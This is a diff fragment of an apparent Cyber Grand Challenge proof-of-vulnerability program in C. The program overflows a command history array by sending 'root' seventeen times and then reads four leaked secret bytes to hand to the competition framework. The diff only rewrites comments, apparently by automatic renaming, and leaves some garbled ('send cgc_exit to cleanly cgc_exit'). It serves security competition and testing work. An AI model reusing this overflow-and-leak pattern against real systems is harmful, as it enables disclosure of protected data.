@@ -132,17 +132,17 @@ int main(void) {
 	// negotiate a Type2 POV with the Competition Framework
 	NegotiateType2Pov(&type2_addr, &type2_size, &type2_length);
 
-	// read in the prompt
+	// cgc_read in the prompt
 	ReadBytes(0, buf, 8);
 
 	// Overflow the command history array
 	for (i = 0; i < 17; i++) {
 		SendString(1, "root\n\r");
-		// read the end of the entered command
+		// cgc_read the end of the entered command
 		ReadUntil(0, '\r', buf, 99);
-		// read the "Invalid command: " message
+		// cgc_read the "Invalid command: " message
 		ReadUntil(0, '\r', buf, 99);
-		// read the next prompt
+		// cgc_read the next prompt
 		ReadBytes(0, buf, 8);
 	}
 
@@ -152,7 +152,7 @@ int main(void) {
 	ReadBytes(0, secret_buf, 4);
 	ReadBytes(0, buf, 9);
 
-	// send exit to cleanly exit
+	// send cgc_exit to cleanly cgc_exit
 	SendString(1, "exit\n\r");
 
 	// send the bytes to the competition framework
